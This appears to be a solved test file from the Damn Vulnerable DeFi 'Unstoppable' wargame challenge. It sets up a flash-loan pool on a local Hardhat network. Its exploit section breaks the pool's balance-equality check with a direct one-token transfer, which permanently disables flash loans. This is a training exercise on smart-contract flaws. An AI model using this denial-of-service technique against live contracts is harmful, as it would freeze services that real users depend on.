const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        // A Signer in ethers.js is an object that represents an Ethereum account.
        // It's used to send transactions to contracts and other accounts. Here
        // we're getting a list of the accounts in the node we're connected to,
        // which in this case is Hardhat Network, and we're only keeping the first one.
        [deployer, attacker, someUser] = await ethers.getSigners();

        // A ContractFactory in ethers.js is an abstraction used to deploy new smart contracts,
        // so DamnValuableToken here is a factory for instances of our token contract.
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        // Deploying the contracts to the blockchain. `deploy()` fn
        // returns a Promise that resolves to a contract.
        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        // Depositing tokens to the pool and attacker's address
        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        await this.pool.depositTokens(TOKENS_IN_POOL);

        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

         // Show it's possible for someUser to take out a flash loan
         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
         await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        // Easiest way to revert the flash loan is by failing an assert or a require.
        // The one that catches the eye is that of assert(poolBalance == balanceBefore);
        // due to the equality which are generally easy to break. If we go through `depositTokens`
        // to update the balance of pool contract, it will update balanceBefore as well.
        // So, let's make a transfer outside of it and break the inequality.
        // Why didn't this work?
        // await this.token.transferFrom(attacker.address, this.pool.address, 10);
        await this.token.connect(attacker).transfer(this.pool.address, 1);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
